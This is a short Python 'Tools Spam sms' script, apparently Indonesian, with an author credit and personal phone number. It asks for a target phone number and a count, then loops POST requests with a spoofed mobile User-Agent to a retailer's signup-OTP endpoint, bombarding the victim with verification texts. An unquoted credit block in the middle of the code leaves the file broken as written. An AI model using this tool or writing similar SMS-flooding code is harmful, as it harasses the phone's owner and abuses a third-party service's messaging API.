import os,sys,time,requests
from requests import post
import subprocess

def bersih():
    os.system("clear")
==============================
recode: arisaputra=
no wa:085768567403
github:Github.com/CyberIndoBocah08
===============================


def lagi():
    f = input("coba lagi? (y/t):")
    if f == "y":
       subprocess.call("python sms.py",shell=True)
    elif f == "t":
         print ("exit")
         sys.exit()
bersih()
banner = """
================================
Tools Spam sms
================================
"""
print (banner)
no = input("masukan nomor:")
jl = int(input("masukan jumlah:"))
head = {
"Connection": "keep-alive",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}

dat = {
"phone": no,
}
for i in range(jl):
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=head)
    print ("status:", r.json())
lagi()